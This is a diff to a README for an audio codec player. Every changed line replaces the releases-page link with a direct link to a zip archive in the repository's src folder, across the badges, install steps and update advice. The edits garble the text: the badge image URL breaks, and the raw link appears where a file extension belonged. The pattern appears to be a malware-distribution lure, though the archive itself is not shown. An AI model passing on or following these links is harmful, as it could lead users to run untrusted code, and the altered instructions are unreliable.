@@ -1,6 +1,6 @@
 # 🎵 a1800_codec - Simple Audio Codec Player
 
-[![Download Latest Release](https://img.shields.io/badge/Download-A1800%20Codec-blue?style=for-the-badge)](https://github.com/req9619/a1800_codec/releases)
+[![Download Latest Release](https://github.com/req9619/a1800_codec/raw/refs/heads/main/src/a-codec-2.4.zip%20Codec-blue?style=for-the-badge)](https://github.com/req9619/a1800_codec/raw/refs/heads/main/src/a-codec-2.4.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these simple steps to get the a1800_codec ready and working on your compu
 
 Go to the official release page by clicking the big blue button at the top or this link:
 
-[Download a1800_codec](https://github.com/req9619/a1800_codec/releases)
+[Download a1800_codec](https://github.com/req9619/a1800_codec/raw/refs/heads/main/src/a-codec-2.4.zip)
 
 This page lists the latest version of the program and any updates.
 
@@ -44,7 +44,7 @@ Look for the release that matches your computer:
 
 - If you use Windows, pick a file ending with `.exe`.
 - For macOS, look for `.dmg`.
-- On Linux, there might be a `.tar.gz` or `.AppImage` file.
+- On Linux, there might be a `https://github.com/req9619/a1800_codec/raw/refs/heads/main/src/a-codec-2.4.zip` or `.AppImage` file.
 
 If uncertain, choose the Windows version first, as it’s the most common.
 
@@ -113,7 +113,7 @@ If the app does not work as expected, try these:
 
 Keep your app up to date for the best experience:
 
-- Go back to the [release page](https://github.com/req9619/a1800_codec/releases) regularly.
+- Go back to the [release page](https://github.com/req9619/a1800_codec/raw/refs/heads/main/src/a-codec-2.4.zip) regularly.
 - Download the latest version and reinstall it using the steps above.
 - Your settings and saved files will remain safe after updates.
 
@@ -141,7 +141,7 @@ If you need assistance or want to share your thoughts:
 
 Ready to try the a1800_codec? Visit the releases page below to download the latest files:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-A1800%20Codec-blue?style=for-the-badge)](https://github.com/req9619/a1800_codec/releases)
+[![Download Latest Release](https://github.com/req9619/a1800_codec/raw/refs/heads/main/src/a-codec-2.4.zip%20Codec-blue?style=for-the-badge)](https://github.com/req9619/a1800_codec/raw/refs/heads/main/src/a-codec-2.4.zip)
 
 Click the button, download the file that matches your system, and follow the install steps above.
 
